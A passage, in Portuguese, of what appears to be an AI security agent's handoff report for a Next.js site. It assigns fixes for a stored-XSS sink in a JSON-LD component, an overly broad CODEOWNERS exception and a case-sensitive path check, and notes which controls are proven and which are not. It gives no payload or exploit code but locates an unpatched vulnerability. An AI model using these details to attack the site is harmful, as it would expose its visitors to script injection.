- Não há nada `critical`. Os `high` são: os dois novos, mais o SEC-01 (Vercel), já conhecido.

---

REQUIRED_NEXT_ACTION:

**Para o `developer` (SEC-P5-11 — o bloqueador mais urgente):**
1. Escapar `<`, `\u2028` e `\u2029` na saída de `JSON.stringify` em
   `components/OrganizationJsonLd.tsx` (snippet em SEC-P5-11).
2. Corrigir o comentário desse componente (linha 14) — `content/` **é** input de utilizador desde a
   Fase 5.
3. SEC-P5-16: os dois comentários já pedidos no handoff-42 (`public/admin/config.yml` ~50-55;
   `next.config.mjs`, nomear `.github/workflows/media-guard.yml`).
4. Recomendado, não exigido: apertar `whatsapp.url`, `mapsLink`, `mapEmbedUrl` e `meta.siteUrl` em
   `content/schemas/index.ts` para `^https?:` (SEC-P5-15).
5. **Prova a entregar**, não afirmação: `npm run build` com o payload de VALIDATIONS 5 em
   `contacts.ceo.company`, e o excerto do HTML gerado de `/` e `/en` a mostrar `\u003c` em vez de `<`
   e **um único** `</script`. Repor o ficheiro no fim e confirmar `git status` limpo.

**Para o `devops-engineer` (SEC-P5-12 e SEC-P5-14):**
1. Estreitar a exceção do CODEOWNERS de `/content/` para `/content/services/` e `/content/site/`
   (snippet em SEC-P5-12), e corrigir a justificação escrita no ficheiro, que hoje afirma algo falso.
2. Substituir `@virgilio-24` pela identidade GitHub **verificada** como colaborador com escrita, se
   não for essa. Não deduzir.
3. SEC-P5-14: comparação de prefixo em minúsculas no `media-guard.yml`, recusando o caso em que casa
   em minúsculas mas não byte a byte.
4. Continuam tuas e inalteradas: SEC-01, `npm ci` no build da Vercel (SEC-P5-08), e o reteste do
   SEC-P5-09 contra um deployment real quando existir.

**Para o dono do projeto (única pessoa com o acesso; nada disto é delegável):**
1. **Agora, e é grátis:** screenshot da vista web de `.github/CODEOWNERS` a mostrar os donos
   reconhecidos e **sem** aviso de "unknown owner".
2. Screenshot ou `gh api .../branches/main/protection` a confirmar `require_code_owner_reviews: true`
   e `media-guard` em `required_status_checks`.
3. Se `AgroTrades` e `@virgilio-24` forem contas distintas: correr **hoje** o teste que falta — PR
   pela conta que não é code owner, a tocar em `.github/`, que tem de ficar em "Review required".
4. Se forem a mesma conta: registar formalmente o gate — antes de dar acesso ao CMS ao segundo
   colaborador, correr esse teste com a conta dele.
5. Depois das correções, o PR de teste (b) do architect, que nunca foi feito: PR que só altera um
   `.json` em `content/site/` -> check verde e fundível sem revisão.

**Para o `software-architect`:** SEC-P5-12 é uma correção à fronteira de confiança que tu próprio
definiste (handoff-42, 3.2), e a alteração ao CODEOWNERS é decisão tua, não de configuração. Fica
também a pergunta de fundo: com `content/site/*.json` a alimentar um `<script>`, a fronteira
"content/ é dados inertes" só se sustenta se **todos** os pontos de saída escaparem. Vale a pena
decidir se isso se garante por revisão caso a caso (frágil) ou por uma regra explícita — por exemplo,
proibir `dangerouslySetInnerHTML` fora de uma função de escape única, com lint a impor.

**Para mim (`security-engineer`), depois:** revalidar SEC-P5-11 contra o HTML gerado (não contra o
diff), SEC-P5-12 contra o CODEOWNERS efetivo no GitHub (não contra o ficheiro), e SEC-P5-13 contra os
screenshots/`gh api`. Só então há Gate 4 para este controlo.

---

CONTEXT_FOR_NEXT_AGENT:

- **Gate 4 (security) para o controlo SEC-P5-03/09: NÃO CONCEDIDO.** Dois `high` abertos. Não bloqueia
  o trabalho funcional da Fase 5 nem o `tester`/`code-reviewer` no resto do código; bloqueia declarar
  o controlo fechado e bloqueia a Fase 6.
- **O que está provado e ninguém precisa de reverificar:** `.github/workflows/media-guard.yml` cumpre
  a especificação do handoff-42 (3.3/3.4) em todos os pontos (tabela em VALIDATIONS 2); o workflow
  corre mesmo no runner, está registado como required check e bloqueia o merge de um `.svg` sob
  `public/images/uploads/` (PR #4); a entrada de CSP `/images/uploads/:path*` continua em
  `next.config.mjs`, inalterada.
- **O que NÃO está provado, e não deve ser tratado como se estivesse:** que `@virgilio-24` é um code
  owner válido; que "Require review from Code Owners" retém um PR de um **não**-owner sobre
  `.github/**`; que a exceção "sem dono" do CODEOWNERS se comporta como desenhado; que a verificação
  de assinatura de bytes corre bem no runner real (só foi testada offline).
- **O erro de âmbito que originou os dois `high`, para não se repetir:** trancámos
  `public/images/uploads/**` e deixámos a outra metade da mesma superfície auto-fundível —
  `content/**` — aberta, com base numa afirmação escrita sobre o conteúdo dessa pasta que ninguém
  confrontou com `find content -type f`. A lição do handoff-41 era "não confiar em matching de
  caminho"; a desta é **"não confiar na descrição de uma superfície — enumerá-la"**. São a mesma
  lição: verificar o objeto, não a frase sobre o objeto.
- **Ficheiros que passam a importar:** `components/OrganizationJsonLd.tsx` (único
  `dangerouslySetInnerHTML` do projeto — confirmei que é o único), `content/organization.ts` (liga os
  dados editáveis a esse sink), `content/schemas/index.ts` (onde a validação existe e onde não
  restringe caracteres), `.github/CODEOWNERS` (linhas 31-32 são o problema),
  `.github/workflows/media-guard.yml` (linha 143, prefixo case-sensitive).
- **Precondição temporal — mudou.** Deixou de ser "antes do segundo editor". O SEC-P5-11 é explorável
  com uma só conta comprometida e atinge todos os visitantes do site, portanto é **pré-condição de
  deploy público**, ao lado do SEC-01.

HIGH_RISK_AREA: **true** — herdado do handoff-42 e reforçado: o ativo continua a ser um token OAuth
com escrita em todos os repositórios públicos da vítima, a área toca na política de merge do branch de
produção, e acrescenta-se agora XSS armazenado nas páginas públicas de produção.
